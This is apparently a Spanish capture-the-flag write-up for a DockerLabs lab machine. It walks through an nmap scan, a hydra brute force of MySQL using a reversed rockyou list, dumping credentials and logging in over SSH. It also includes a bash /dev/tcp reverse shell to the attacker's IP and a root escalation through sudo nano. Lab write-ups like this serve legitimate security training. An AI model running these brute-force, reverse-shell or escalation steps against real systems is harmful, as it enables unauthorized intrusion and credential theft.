# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/675538d0-d1b2-48e0-945f-c386438e1719)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 8.9p1 (Ubuntu)
2.  **80/tcp(HTTP):** Apache httpd 2.4.52
3. **3306/tcp(Mysql):** MySQL 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a una pagina con una foto de un capybara.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fd2f79b1-88cd-43da-b34a-4e9b5ab15fd0)

# Fase 2- Exploración

#### CTRL + U
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fb1fe7ff-ad8d-4554-a601-dfc7d6347f6b)
Al hacer fuzzing web no encontramos nada, pero al ver el codigo interno de la pagina encontramos un mensaje `"Hola capybarauser, esta es una web de capybaras. He securizado mi password, ya no se encuentra al comienzo del rockyou..., espero que nadie use el comando tac y se fije en las últimas passwords del rockyou"`

Nos dan una pista, y es que la contraseña de **"capybarauser"** se encuentra al final del famoso diccionario **rockyou**. El comando **tac** que se menciona, permite leer y mostrar el contenido de un archivo en orden inverso. De forma que le aplicamos este comando al **rockyou** y almacenamos el resultado en un nuevo fichero que llamaré "**MiRockYou.txt**" para poder usarlo como diccionario en un ataque de fuerza bruta.

```shell
tac /usr/share/wordlists/rockyou.txt > MiRockYou.txt
```

# Fase 3- Explotación

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/67e133ae-04d8-4332-b00c-d72aec310932)
Tenemos que tener cuidado con las primeras líneas del nuevo diccionario, que están corruptas, quitamos los caracteres extraños y continuamos con la fuerza bruta. Con este nuevo diccionario realizaremos un ataque de fuerza bruta contra el puerto **3306** donde corre el servicio **MySQL**.. Lo haremos con la herramienta **hydra**.

```shell
hydra -l capybarauser -P MiRockYou.txt mysql://172.17.0.2 -t 4
----------------------------------------------------------------
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybarauser   password: ie168
```
Encontramos credenciales para el usuario **capybarauser:ie168**

Accedemos a la base de datos con las nuevas credenciales:
```shell
mysql -h 172.17.0.2 -P 3306 -u capybarauser -p
(ponemos la contraseña ie168)
```

Enumeraremos un poco la base de datos.
```sql
MariaDB [(none)]> show databases;
------------------------------------
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pinguinasio_db     |
| sys                |
+--------------------+
```

```sql
use pinguinasio_db;
show TABLES;
-------------------------------
+--------------------------+
| Tables_in_pinguinasio_db |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0,001 sec)
```

```sql
select * from users;
------------------------------
+----+-------+------------------+
| id | user  | password         |
+----+-------+------------------+
|  1 | mario | pinguinomolon123 |
+----+-------+------------------+
1 row in set (0,001 sec)
```

Encontramos un usuario y su contraseña: "**mario:pinguinomolon123**" Trataremos de entrar por **SSH**.

```shell
ssh mario@172.17.0.2
```

Estamos dentro!

# Fase 4- Privilegios
### Tratamiento de la tty

Si tenemos problemas al aplicar el tratamiento de la **tty**, lo que podemos hacer es ponernos en escucha desde una consola nueva por un puerto. Por ejemplo con **netcat**

```shell
nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/192.168.1.17/443 0>&1" 
```
(Siendo la 192.168.1.17 mi IP)

---

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:
```shell
script /dev/null -c bash 
```

(hacemos **ctrl + Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina. Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

---

## Escalada de privilegios


Hacemos un **sudo -l** para ver si podemos ejecutar algo con privilegios de otro usuario o de root.

```shell
sudo -l
------------------
(ALL : ALL) NOPASSWD: /usr/bin/nano
```

Podemos ejecutar **nano**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario root. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

```shell
sudo nano
^R^X (Ctrl+R y Ctrl+X)
reset; sh 1>&0 2>&0
```

Somos root!
```shell
whoami
----------------
root
```
